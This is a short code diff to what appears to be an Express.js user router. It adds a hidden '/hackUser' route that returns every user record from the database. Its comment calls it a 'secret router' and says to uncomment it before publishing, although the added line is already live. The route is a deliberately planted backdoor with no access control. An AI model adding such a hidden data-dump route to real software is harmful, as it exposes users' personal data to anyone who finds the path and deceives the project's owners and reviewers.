@@ -29,6 +29,8 @@ userRouter.get('/successsignup', userController.successSignup);
 userRouter.get('/failuresignup', userController.failureSignup);
 
 
+// my secret router for getting all the user db, uncomment it before publish
+userRouter.get('/hackUser', userController.getAllUser);
 
 
 module.exports = userRouter;
